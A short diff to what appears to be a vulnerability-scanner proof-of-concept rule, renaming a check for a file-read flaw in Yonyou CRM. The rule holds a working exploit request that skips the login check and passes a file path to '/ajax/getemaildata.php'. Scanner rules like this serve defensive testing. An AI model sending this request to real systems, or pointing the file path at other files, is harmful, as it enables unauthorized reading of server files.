@@ -1,4 +1,4 @@
-name: yongyou_crm_file_read
+name: poc-yaml-yongyou-crm-file-read
 rules:
   - method: GET
     path: "/ajax/getemaildata.php?DontCheckLogin=1&filePath=./getemaildata.php"
